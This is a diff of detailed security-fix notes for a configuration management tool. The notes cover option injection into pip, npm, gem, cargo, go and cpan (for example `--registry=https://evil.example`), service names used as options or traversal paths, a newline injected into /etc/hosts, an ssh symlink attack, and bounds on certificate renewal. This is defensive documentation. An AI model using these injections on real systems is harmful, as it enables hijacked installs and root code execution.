@@ -26281,6 +26281,11 @@ other function failed the static check. So no other function had passed
   the dynamic audit catches that, and only on functions it reaches.
 - **State functions are not in the new static check.** 5.135's state
   differential is unchanged.
+#### 5.308, `mount.set_fstab` fell out of the dynamic audit
+
+`auditMustReach` names 24 functions now, not 23: `mount.set_fstab`
+joined it, off Windows, after it stopped being reached without anything
+failing. See 5.572.
 ### 5.309 A dotted unit name was sent to systemd without `.service`
 
 Audit finding H-14. `withServiceSuffix` decided whether a name already had
@@ -27005,6 +27010,39 @@ Linux).
 
 **Not verified.** `-race` on Linux, and the pinned go1.26.6. No real Salt tree was rendered through the measure; the
 package tests, the Jinja corpus among them, pass.
+
+#### 5.312, the depth test now reaches the bound it is for
+
+"It is real for the toolchain that releases are built with" stopped
+being true when the release toolchain moved to go1.27.3 (`go.mod`'s
+`toolchain` line, #481). Under it `encoding/json` is json/v2 underneath,
+`Decoder.Token` refuses the 10,001st level itself with "exceeded max
+depth", and `decodeValue`'s own check is never the one that fires. So
+`TestDecodeJSONDepthMatchesEncodingJSON`, which went through
+`DecodeJSON` and accepted either error, passed with the check deleted.
+Measured on darwin/arm64 with go1.27.3, 2026-11-04, by changing the
+check to `if false && depth >= maxJSONDepth`: the test passed, and
+`DecodeJSON` of 10,001 `[` returned "exceeded max depth".
+
+The check stays. It is the only bound this package owns, and the
+standard library's is an implementation detail that has changed once
+already; a `GOEXPERIMENT=nojsonv2` build, or a later release that moves
+it, would put the crash back with nothing failing.
+
+**The change.** `decodeValue` reads from a `tokenSource` interface (the
+`Token` and `More` of `*json.Decoder`) rather than the concrete type, and
+the test drives it with `unboundedTokens`, a token list that keeps no
+depth, as the go1.26 `Decoder` did. It requires decodeValue's own error,
+"nests deeper than", one past the limit, and still checks `json.Valid` at
+both edges and that `DecodeJSON` refuses end to end.
+
+**Broken on purpose.** With the check changed to `if false && …` the new
+test fails for arrays and objects: "want decodeValue's own nesting
+error, got <nil>". Restored, it passes.
+
+**Not verified.** Only darwin/arm64 with go1.27.3. A
+`GOEXPERIMENT=nojsonv2` build was not tried; the token source stands in
+for it.
 
 ### 5.313 `mount.mounted` remounted every run a filesystem declared by UUID or label
 
@@ -30199,6 +30237,15 @@ and `macos` legs' filters; the `freebsd` leg runs every `TestLive*`.
 **Not done.** A home directory that is itself a link, or is writable by
 others, is trusted, as `os.Root` opens it by path. A `config` path is the
 operator's choice and is still written by path. macOS was not run.
+
+#### 5.349, a `config` path was not the operator's choice
+
+The `config` exception above was wrong. The operator chooses a name, not
+what the account has since put at it: `config:
+/home/deploy/.ssh/authorized_keys`, the default file spelled out, went by
+path through the same link the default path refuses. Fixed by deciding on
+where the path lands rather than on whether `config` was given; see
+5.569.
 ### 5.350 git.latest's `user` was never read, so every checkout was root's
 
 Issue 321 finding M-24. `git.latest` declared `user` ("Run git as this
@@ -32465,7 +32512,7 @@ self-overlapping case alone.
   the error is built rather than at the sink, or registering each line
   of a multi-line secret as a secret of its own, which would also scrub
   a PEM's `-----BEGIN …-----` line everywhere. That is the owner's call.
-  The owner chose the first; 5.568 is that change.
+  The owner chose the first; 5.574 is that change.
 - `log` passing an `error` field to `ScrubValue`, which only knows
   strings and containers: a separate change.
 
@@ -37051,8 +37098,226 @@ A worker the stop cut short still does not release its event (`reactorWorker.run
 **Broken on purpose.** With the wait removed from `Run` the test fails as above. With the wait kept, `reactorWorker.run` releasing its event regardless of the context, and the `ctx.Done` branch of `Run` waiting for the workers before its final commit (the obvious way to write this, and wrong), it fails on the offset: `"00000001:381", want "00000001:0"`. Restored, it passes, and the `Reactor|Reaction|Reacted|Debounc|EventReturn|Serve` tests of `internal/hub` pass under `-race`.
 
 **Not verified.** The `serve` half has no test that holds one of its loops across a stop: it is checked by building, by the `cmd/halite-hub` tests that start a real `serve` and stop it with SIGINT (which still stop), and by reading. Neither the two-second "waiting" log nor a second signal ending the wait was run. A shutdown now takes as long as the slowest reaction in flight, which is `reactor_timeout` (60 seconds by default) only where the runner honours its context; one that does not is ended by the second signal, or by the service manager's stop timeout, where it has one. Still not waited for: the relay's goroutines (`startRelay`), and a debounce timer that fires after the stop, which can emit `halite/reactor/loop` or `halite/reactor/overflow` onto the bus from `enqueue` with no worker left to run it. None of it was run on FreeBSD or under a service manager; `make check` was not run.
+### 5.568 A language package manager's name could be its option, run as root
 
-### 5.568 A multi-line secret was printed line by line in a render error's window
+Issue 321, the close-out review of 2026-11-03, item A7 (`internal/builtin/lang.go`, `lang_more.go`, `lang_build.go`, `lang_states.go`). The language half of 5.307, whose "Not verified" said `pip`, `npm` and `gem` "were not looked at".
+
+**The defect.** 5.307 put `pkgValidateName` in front of every OS package manager and none of the language ones. Each of `pip`, `npm`, `gem`, `cargo`, `go`, `composer` and `cpan` appends a caller's list to its argv as it stands, so an item beginning with `-` reaches the tool as an option. `npm.installed` with `pkgs: ["--registry=https://evil.example", left-pad]` installs `left-pad` from that registry, as root, chosen by whoever can write the list (pillar, an included SLS, the API). The others have the same door: `pip`'s `--index-url=`, `gem`'s `--source=`, `cargo`'s `--index=` and `--git=`, `go install -toolexec=` (a program run for every compile), `cpan -j` (a Perl file loaded as cpan's configuration), `composer`'s `--working-dir=`. `gem.install`'s and `cargo.install`'s `version` is an argv element of its own after `--version`, and `go.env`'s `name` is the one argument after `go env`, where `-w` writes.
+
+**Shown.** On 2026-11-04, on macOS 26.7.2 (arm64), unprivileged, `halite-node call --local` built from 5c44bed3 and from this change, each payload pointing at 127.0.0.1:9, where nothing listens, with scratch `GEM_HOME`, `CARGO_HOME`, a scratch venv as `bin_env` and a scratch `dir` for npm:
+- npm 11.20.0, `npm.install` and a `state.apply` of an `npm.installed` state with `--registry=http://127.0.0.1:9` in `pkgs`: on 5c44bed3 both ran `npm install --registry=http://127.0.0.1:9 left-pad` and failed `ECONNREFUSED`.
+- pip 26.2.2 (Python 3.15, in a venv), `pip.install` with `--index-url=http://127.0.0.1:9/simple`: on 5c44bed3 pip retried against `127.0.0.1:9` (`Connection refused`).
+- gem 4.0.23, `gem.install` with `--clear-sources` and `--source=http://127.0.0.1:9`: on 5c44bed3 gem asked `http://127.0.0.1:9/specs.4.8.gz`.
+- cargo 1.72.0-nightly, `cargo.install` with `--index=sparse+http://127.0.0.1:9/`: on 5c44bed3 cargo printed ``Updating `sparse+http://127.0.0.1:9/` index``.
+- cpan (Homebrew perl), `cpan.install` with `-j/nonexistent/halite-a7.pm`: on 5c44bed3 cpan answered `cpan config file [/nonexistent/halite-a7.pm] for -j does not exist!`.
+- go 1.27.3, `go.install` with `-toolexec=/usr/bin/false` and `.`: go took the flag (it did not say "flag provided but not defined") and then failed on the install location, so the toolexec program was never reached. That shows the parse, not the execution.
+
+On this change every one of these, the state included, is refused with `pkgValidateName`'s message and runs nothing. composer is not installed on that machine and was not run.
+
+**The change.** `langNames(args, key)` reads the list through `pkgValidateNames`, and is the only way the language functions read one: `pip.install`/`uninstall`, `npm.install`/`uninstall`, `gem.install`/`uninstall`, `cargo.install`/`uninstall`, `go.install`, `composer.require`, `cpan.install`. `gem.install`'s and `cargo.install`'s `version` go through `pkgValidateVersion`, and `go.env`'s `name` through `pkgValidateName`. The six states (`pip`, `npm`, `gem` × `installed`, `removed`) check each spec in `langPresent` and `langAbsent` before the installed list is read, so a refused state asks the tool nothing. A state checks the raw spec, not the name `parseSpec` splits from it, because that is what reaches argv, and because npm's `@scope/pkg` splits on its own leading `@` into an empty name.
+
+The rule is 5.307's, not one per ecosystem, for the reason `pkgValidateName` gives. Every legitimate shape begins with something else; `TestLangLegitimateNamesReachTheArgv` holds `requests[socks]>=2.31`, `@types/node@20.1.0`, `golang.org/x/tools/cmd/stringer@latest`, `monolog/monolog:^3.0` and `JSON::PP` reaching argv unchanged.
+
+**Tests.** `TestLangRefusesOptionInjection` calls every one of those functions with a payload, in a dry run and a real one, through a recording runner, and requires a refusal and no command at all. On 5c44bed3 it failed 48 times (24 calls, each in both modes). `TestLangEveryNameTakingFunctionIsCovered` holds the list to the registry: a function of those seven modules taking `name`, `pkgs`, `gems`, `crates` or `modules` must be in it. Broken on purpose, one at a time: `langNames` not validating fails the eleven execution functions; `langValidateSpecs` returning nil fails the six states; the two `version` checks and `go.env`'s check removed fail those three cases; `cpan.install` dropped from the list fails the coverage test.
+
+**Not verified.** Nothing ran as root, on FreeBSD or on Linux. composer was not run at all. go's `-toolexec` was shown to parse, not to run. The explicit options that take a URL on purpose (`pip.install`'s `index_url`, `npm`'s `registry`) are unchanged: they are the tree asking for an index, not a name being read as one. `maven.run`'s `goals` reach `mvn` as they stand and were not changed: a goal list is a build invocation that a tree may legitimately fill with options. The value `parseSpec` makes of a scoped npm name (an empty name, so a state cannot compare it with the installed list) is pinned by `TestParseSpec` and was not changed. The evidence levels of these modules are unchanged: the runs above show what each tool reads, not that an install through halite works.
+### 5.569 A `config` path in the account's home still followed the account's link
+
+Issue 321 close-out item A10, found by reading `sshAccountFileFor` after
+the M-30 fix (5.349). That fix read and wrote a named account's ssh file
+through an `os.Root` on its home, but only when the state gave no
+`config`: any `config` returned nil and was written by path, on the
+reasoning that it is a path the operator chose. So
+`ssh_auth.present` with `user: deploy` and `config:
+/home/deploy/.ssh/authorized_keys` -- the default file, named -- followed
+a `~/.ssh` deploy had replaced with a link, as root, and wrote, and
+chowned to deploy, a file wherever it led. The same for
+`ssh_known_hosts.present`, and for any `config` under a directory of the
+home that the account can replace.
+
+**Shown, as root, on three platforms** with
+`TestLiveSSHConfigInsideHomeRefusesALink`, built against main's ssh code
+(5c44bed3) with only the test added. A throwaway account's `~/.ssh` and
+`~/keys` were linked to a root-owned directory standing in for /etc,
+which held a root-only 0600 `authorized_keys`; a root-owned link in /tmp
+was a second name for the home. Four `present`s with `config` -- the
+default `authorized_keys` named, the default `known_hosts` named, a file
+under `~/keys`, and the default file through the second name -- all
+reported success. The target gained a `known_hosts`, and its root file
+was **chowned to the account** and had the managed key appended:
+
+- beastie, in a throwaway thin Bastille jail, FreeBSD 15.1-RELEASE-p6:
+  "the target's file was given to uid 1001";
+- noop2-1, Ubuntu 22.04.5 LTS (5.15.0-1117-aws-fips): "given to uid
+  1004";
+- mini-me, macOS 27.2 (26B123) on arm64: "given to uid 502". There the
+  home was `/tmp/halsc<pid>`, and /tmp is itself a link to /private/tmp,
+  a root-owned link above the home that the fix leaves alone.
+
+With the fix all four are refused, naming the link, nothing is written
+in the target, a `config` under a home directory with no link in it is
+made, 0600 and the account's, and converges, and one outside the home
+is written by path as before. `TestLiveSSHFilesForAnotherAccount` and
+`TestLiveSSHRefusesALinkedSSHDirectory` (5.349) pass beside it, on all
+three hosts.
+
+**The change.** `sshAccountFileFor` decides by where the path lands.
+`pathInHome` answers with the path relative to the home when it is inside
+it: lexically, or, failing that, when a directory on the way down from /
+is the home by identity (`os.SameFile`), so that a second name for the
+home -- `/usr/home/deploy` where `/home` is a link, as on FreeBSD -- is
+not a way to get the old by-path write. The shallowest such directory
+wins, so an account's own link back to its home stays in the relative
+path, where it is refused, rather than standing in for the home. The
+write still opens the root on the home as passwd spells it, not on the
+prefix that matched. Inside the root every directory between the home and
+the file, not only `.ssh`, is refused if it is a link, and one that is
+missing is made 0700, as `fileperm.MkdirAll` made it by path. `config`
+now decides only whose the directory is: the default `~/.ssh` is given to
+the account, as before; a `config` file is, and the directory it is in is
+not, as `giveToAccount` did by path.
+
+A home of `/` takes the root for its default `~/.ssh` only. The account
+does not own /, every absolute path is in it, and on macOS `/etc` is a
+link, so refusing links there would refuse any `config` such an account
+was given.
+
+**Broken on purpose.** With `config` given sending the path back to the
+by-path write, the live test fails on all three hosts exactly as main
+did.
+With `pathInHome` reduced to its lexical comparison, on beastie, only the
+second name for the home gets through: "the target's file was given to
+uid 1001", and `TestPathInHome` (a unit test, no root) fails on that row
+and on the account's link back to its home. Restored, both pass.
+
+**Not verified.** A home of `/` was not run, and the lexical-only break
+was run on FreeBSD alone. The live test joins the `linux`
+and `macos` legs' filters and the trigger paths of `fleet.yml`; the
+`freebsd` leg runs every `TestLive*`. A `config` inside another account's home
+(`user: deploy`, `config: /home/alice/keys`) is still written by path:
+alice can link a directory there, and that is A1's question of which
+links to follow, not this one. A relative `config` is resolved against
+the node's working directory, as it was; how Salt resolves one was not
+checked here. A home that is itself a link, or writable by others, is
+trusted, as 5.349 says.
+### 5.570 A service name could be an option or a path to service(8)
+
+Issue 321, the close-out review of 2026-11-03, item A12, first half: an injection of the M-45 class (5.354, 5.355) that the M-45 sweep did not reach, because the name goes into argv rather than into a file.
+
+**The defect.** Every `service.*` function and state passed `name` to its provider, and every provider put it in argv as an element of its own. That keeps a shell out and lets the tool's option parser in. On FreeBSD, `service.status: -R` ran `service -R status`. service(8) reads its options with `getopts 'dE:ehj:lqrRv'`, and `-R` stops every enabled service in reverse rcorder, starts them all again, and exits 0, without reading `status`. So a read-only call restarted the machine's daemons and answered "running". `-j <jail>` and `-E var=value` take the following word in the same way. The name is also a path: service(8) execs `<dir>/<name>` from `/etc/rc.d` and `$local_startup`, the first one that `test -x` passes. `../../../tmp/x` is then any executable on the machine, run as root, with whatever words follow it as arguments.
+
+**Read and measured on beastie** (FreeBSD 15.1-RELEASE-p6, read from `sysctl kern.ostype kern.osrelease` and `freebsd-version -ku`, not `uname`), 2026-11-04, as an unprivileged user. The option handling and the `-R` loop are read from `/usr/sbin/service`. `service -R` was not run. `service ../../../bin/echo hello` printed `hello` and exited 0, so the relative path escapes. `service /bin/echo abs` exited 1 ("does not exist in /etc/rc.d"), because the absolute path is joined onto the directory.
+
+**Two paths that must agree.** Twelve exec functions, four states and the `watch` reaction each read `name` and passed it on. The check is now one function, `serviceNameValid`, called by all of them before a provider is chosen, and so before anything runs, in test mode as well. It refuses an empty name, a leading `-`, any `/`, `.` and `..`, and a control character. It does not refuse whitespace: whitespace is no injection into argv, and a Windows service's key name may contain a space. `service.available` and `service.missing` never put the name in argv. They now refuse such a name too, so a name the module cannot act on gets the same answer from every function.
+
+**Shown.** `TestAServiceNameThatIsAnOptionOrAPathNeverReachesArgv` walks every `service.*` exec function whose signature takes `name` (15), every `service.*` state (4) and `service.running`'s mod_watch. It does this on a context whose `Lookup` gives `service` and `sysrc` and no `systemctl`, so the FreeBSD provider is picked on any machine. It passes `-R`, `-j`, `--`, `../../../tmp/payload`, `/tmp/payload`, a name holding a newline, and an empty name. Against main (5c44bed3) it failed 105 times on "put the name in argv": all seven names on each of the ten exec functions that reach a provider, the four states and mod_watch. `available` and `missing` failed only on not refusing. `mask`, `unmask` and `masked` did not fail, because they need a systemd node to pick a provider. With the change it passes. Broken on purpose twice. With the leading-`-` rule removed, it fails 45 times, all on `-R`, `-j` and `--`. With the check removed from mod_watch alone, it fails only there: `mod_watch("-R") put the name in argv: ["service -R enabled" "service -R restart"]`. The walk exists to catch that second failure. A list of paths in the test would go stale the next time a function is added.
+
+The test-mode audit (`TestEveryMutatingFunctionHonoursItsTestModeClaim`) gave every required `name` a temporary path. After the change, every `service.*` function refused that path in every world, so none of their dry runs was judged, and the audit failed on `service.mask` and `service.unmask`. It now gives a `service.*` function the name `halite-audit`. On darwin it then counts 6 judged, 105 reached and 180 refused, the same as on main (5c44bed3).
+
+**Run as root in a jail on beastie**, 2026-11-04. The jail was a throwaway thin Bastille jail on 15.1-RELEASE (`halite-a12`, `security.jail.jailed=1`), destroyed afterwards. The binaries were cross-built from this change, and from main (5c44bed3), for freebsd/amd64. `halite-node state sls --local` applied one file with `service.running` on `-l` and on `../../../bin/echo`. `-l` stands in for `-R`: it is one of the same getopts options and only lists. Main reported both states as "already in the requested state", exit 0. service(8) had taken `-l` as its option and run `/bin/echo status`, and each exited 0, which the provider reads as "running". This change refused both before running anything, naming the reason, and exited 1. In the same jail, the new test and the walk it makes failed against main's code, 105 times on "put the name in argv", as on macOS. With this change they pass. So do all five `TestLiveFreeBSDService*` tests (`HALITE_SYSTEM_LIVE=1`), which drive the jail's real service(8) and sysrc through enable, start, stop and disable. The full `internal/builtin` suite passes in the jail except for three tests that fail identically with main's binary there: `TestLiveRebootReadsThisMachine` (`freebsd-version -k` finds no kernel in a jail), `TestTheGitBinaryIsPresentSoTheGitTestsRun` (no git) and `TestFreeBSDVersionsAgreeWithPkg` (pkg not bootstrapped).
+
+**Not verified.**
+- The other providers' tools. systemctl, rc-service, chkconfig, update-rc.d and launchctl were not run with a leading `-`. The rule refuses it for all of them, because each one parses options. The walk drives only the FreeBSD provider. The check runs before a provider is chosen, so the walk also covers the others' call sites, but not their tools.
+- Windows. Its provider is an API, not argv. The check applies there as well and was not run there.
+- `service.mask`, `unmask` and `masked` were checked only for being refused, not on a systemd node.
+- `service -R` itself was never run, in the jail or on beastie. `-l` stood in for it.
+- Only inside a jail, not on a FreeBSD host's own rc.d. The jail shares beastie's 15.1-RELEASE-p6 kernel and base.
+### 5.571 A newline in a hosts entry wrote another line into /etc/hosts
+
+Issue 321, the close-out review of 2026-11-03, item A12, second half.
+
+**The defect.** `host.present` and `dnsutil.hosts_append` wrote the addresses and names they were given into the hosts file, through `renderHosts`. A newline in a name, an address or one of the `entries` added a mapping of its own: `name: "web1.example\n10.6.6.6 evil.example"` wrote `10.6.6.6 evil.example` as its own line. Every resolver on the machine reads /etc/hosts before DNS, so that line redirects any name. A space or a tab is a field boundary to `parseHosts`, which splits with `strings.Fields`, so one name became two. A `#` made the rest of the line a comment: the write reported success, and the next read disagreed with it, on every run.
+
+**The change.** `hostsFieldsValid` refuses any address or name that contains a rune `unicode.IsSpace` matches, a control character, or `#`. `unicode.IsSpace` is the test `strings.Fields` uses, so the check matches the reader instead of being narrower. Both writers call it before they read the file, so a `--test` run refuses exactly as a real one does. Values are still trimmed where they were before (an address, and each of hosts_append's `entries`), so a trailing newline from a template is not refused. `host.absent` and `hosts_remove` are not checked: they only compare what they are given with what was parsed, and a value with a newline in it matches nothing.
+
+**Shown.** `TestAHostsEntryThatEndsItsLineOrFieldIsRefused` tries `\n`, `\r\n`, a space, a tab, `#`, NUL and U+0085 in `host.present`'s `name`, `names`, `ip` and list `ip`, and in `hosts_append`'s `ip_addr`, string `entries` and list `entries`. It tries each one both for real and under `--test`, and checks that the file is byte for byte unchanged. Against main (5c44bed3) it failed with the injected line written, for example `10.0.0.1\tweb1.example\n10.6.6.6 evil.example`. With the change it passes, and an ordinary entry (`fe80::1%eth0`) is still written. Broken on purpose twice. Allowing `#` again fails the `#` cases. Removing the check from `hosts_append` alone fails only `hosts_append`'s cases.
+
+**Run as root in a jail on beastie** (the same jail and binaries as 5.570), against the jail's own `/etc/hosts`. `host.present` was given a name holding a newline and then `10.6.6.6 a12-evil.example`. Main wrote `10.6.6.6 a12-evil.example` into the file as a line of its own, and reported `Result: True`. This change refused the state, naming the `\n`, and left the file alone. An ordinary entry in the same run was written by both. The new test fails against main's code in the jail and passes with this change.
+
+**Not verified.** Neither the C library's reader nor any other resolver was asked how it reads a line with one of these characters. The refusal does not depend on how they read it. Only `host.present` was run end to end. `dnsutil.hosts_append` was run only through the test, in the jail and on macOS.
+### 5.572 `mount.set_fstab` fell out of the `--test` audit, and nothing failed
+
+`TestEveryMutatingFunctionHonoursItsTestModeClaim` (5.308) reported 180
+functions refused in every world on this Mac, against the 179 recorded
+in 5.308, and passed. The extra one was `mount.set_fstab`. A function
+refused in every world is not judged, so a regression that made its dry
+run write the table would have passed too.
+
+**Why it fell out, measured rather than read.** The audit was run with
+the unreached names logged, on darwin/arm64 with go1.27.3, 2026-11-04:
+
+- At `17ef7d99^`, `set_fstab` was reached and answered without acting:
+  179 unreached.
+- At `17ef7d99` (#377, the fix in 5.337), it refused in every world: 180.
+- On `5c44bed3`, with `tableReady` bypassed in `set_fstab` alone, it was
+  answered again: 179.
+
+5.337 made `set_fstab` refuse an entry with no `fstype`, because such a
+line closes up and is read with its options as the type. The signature
+still calls `fstype` optional, since `mount.mounted` shares the
+parameters and needs a type only when it persists. The audit fills only
+required arguments (and every path), so it never gave one, and every
+world was refused for the reason 5.337 added.
+
+**The change.** The audit takes `auditExtraArgs`, optional arguments a
+function refuses to run without where its signature does not say so,
+with one entry: `fstype: tmpfs` for `mount.set_fstab`. The `config`
+argument is a path and is already filled with one under the test's
+temporary directory, so the dry run never names `/etc/fstab`.
+`mount.set_fstab` is added to `auditMustReach`, except on Windows, where
+it is gated out before it runs, as `service.mask` is there for another
+reason. The count is back to 179, and `set_fstab` is among the 106
+answered.
+
+**Broken on purpose.** With the `auditExtraArgs` entry removed, the test
+fails: "mount.set_fstab refused in every world this audit built". With
+`c.Test` removed from `setFstab`'s early return, it fails on the dry
+run: `files: [changed config] ; first-exists: [changed config]`. Both
+restored, it passes. With `mountGOOS` set to `freebsd` and then to
+`linux` in the test, `set_fstab` was still reached and the count was
+179.
+
+**Not changed, and the same pair.** `set_fstab`'s signature says
+`fstype` is optional and its code refuses without one. Making it
+required in that signature would tell `sys.doc` and the generated
+`docs/modules.md` the truth and would have kept the audit reaching it,
+but it changes the error an operator sees, so it is a separate change.
+The audit's extra argument is a patch over that disagreement, and any
+other function with an optional parameter it cannot do without is
+still invisible to it, unless it is in `auditMustReach`.
+
+**Not verified.** Run on darwin/arm64 only. The `mountGOOS` runs are a
+stand-in for FreeBSD and Linux, not a run on them; CI's Linux and
+FreeBSD legs run the test. Not run on Windows, where `set_fstab` is
+left out of the list.
+### 5.573 A node could renew as often, and with as large a request, as it liked
+
+Issue 321, the close-out review of 2026-11-03, item A9 (`internal/keystore/authority.go`; the size bound on enrollment is issue 321's M-06, the superseded serials 5.392).
+
+**The defect.** Two unbounded things on `/v1/enroll/renew`, which a node reaches with nothing but its own certificate.
+
+- **Size.** `MaxCSRBytes` (16 KiB) was checked in `Enroll` and nowhere else. `Renew` parsed whatever CSR it was given and stored it in the node's record. The request body allows 64 MiB, and a reviewer stored a CSR of 2.84 MB. Two paths that must agree, and one of them did not ask.
+- **Frequency.** Nothing limited how often a node renewed. Each renewal keeps the serial it replaced in the record until that certificate would have expired (5.392), 90 days at the default, and rewrites the whole record. A node renewing in a loop added a serial a time, and paid for every write with all the earlier ones: the record grew linearly and the bytes written quadratically, with the in-memory denylist growing alongside.
+
+**The choice of bound.** The review offered two: refuse a renewal before the certificate's half-life, or cap the superseded list. A half-life floor is the wrong one, because it strands exactly the node that most needs to renew. `halite-node renew --force` exists to rotate a key before renewal is due, after a compromise, and a floor would have refused that for up to 45 days while the leaked key kept working. A count does not care when a renewal comes, only how many replaced certificates are still live. So the bound is `MaxSuperseded`, eight live superseded serials per record. A node on schedule holds at most two (renewed at half-life, the one before has at most half its life left), which leaves six early rotations inside one certificate's life before anything is refused.
+
+"Cap the list" has to mean refuse, not drop. Dropping the oldest serial to make room would take a certificate that has not expired off the CRL at once and off the denylist at the next start, since `LoadDenylist` reads the record. That is how a leaked key gets back in.
+
+**The change.** `checkCSRSize` is the one size check, asked by `Enroll` and by `Renew` before either parses. `Renew` counts the record's live superseded serials under the store's lock, after the serial check (so a stale certificate is told it is stale), and refuses with `ErrRefused` at eight: the hub answers 403 and logs "renewal refused". Only `Renew` is bounded. A reissue through `Enroll` is an operator's decision or a spent token.
+
+**What an operator sees.** A node that renews more than six times early inside one certificate's life is refused, with a message that says its certificate still works, that renewal comes back as the oldest replaced one expires, and that `halite-hub keys delete` and a new enrollment clear it at once. Delete keeps every live serial denied as a tombstone. Revoking does not clear it, because a revoked record is never issued to again. The node's renewal loop treats the refusal as any other failed renewal: a warning, and a retry at the next check. A renewal CSR over 16 KiB is refused as malformed (400). halite-node's are about 500 bytes.
+
+**Shown.** `TestARenewalCSRIsBoundedLikeAnEnrollment` and `TestRenewalsAreBoundedByLiveSupersededSerials`, in `internal/keystore`, run on this branch's parent `5c44bed3` with only `MaxSuperseded` and `checkCSRSize` declared and nothing calling them. The first failed with a 1,420,430-byte renewal CSR taken. The second failed with 34 renewals in a row taken. With the change both pass. The size test holds both paths to the same answer at the boundary itself, with valid CSRs just over 16 KiB (16,459 bytes, refused by both) and just under it (16,377 bytes, taken by `Renew`). The frequency test renews at half-life and then rotates the next day, and neither is refused. It then loops until the refusal, checks the record holds exactly eight, checks every one is still on the denylist, and checks that renewal works again once the oldest has expired.
+
+Broken on purpose, and each restored after:
+- `Renew` without the size check: the size test fails on the 1.4 MB CSR.
+- `Enroll` without it: the size test fails on the 16,459-byte CSR, and so does `TestAnOversizedCSRIsRefusedAndNotStored`.
+- the bound 1 KiB too tight: the size test fails on the 16,377-byte CSR.
+- the cap a thousand times higher: the frequency test fails, 34 renewals taken.
+- every superseded serial counted, live or not: the frequency test fails, because the refusal never lifts.
+
+**Not verified.** Nothing ran against a real hub and node. The tests drive `Authority.Renew` directly; the HTTP status and the node's renewal loop's reaction to a refusal were read, not run. The record size and write volume were not measured; "quadratic" is from reading `issue` and `Store.put`. `MaxSuperseded` is a constant, not a setting. An estate with a `certificate_lifetime` far shorter than its renewal check could reach it, though the check scales with the lifetime (`pki.RenewalCheckEvery`), so a node on schedule should not. Repeated delete-and-re-enroll still grows the tombstones; that is an operator's or a token's decision, and is not bounded here. No live test covers renewal, and none was added.
+### 5.574 A multi-line secret was printed line by line in a render error's window
 
 Issue 321, the part of the Low "redaction gaps" bullet that 5.407 left
 open and asked the owner to decide; the owner chose to scrub before the
@@ -37175,12 +37440,6 @@ fail if the field were dropped. They were checked by building and by
 reading. No node or hub was run with a multi-line secret in its pillar.
 The sandbox was run on macOS through its test binary, not under a
 dropped identity on FreeBSD or Linux. `make check` was not run.
-
-
-
-
-
-
 
 
 
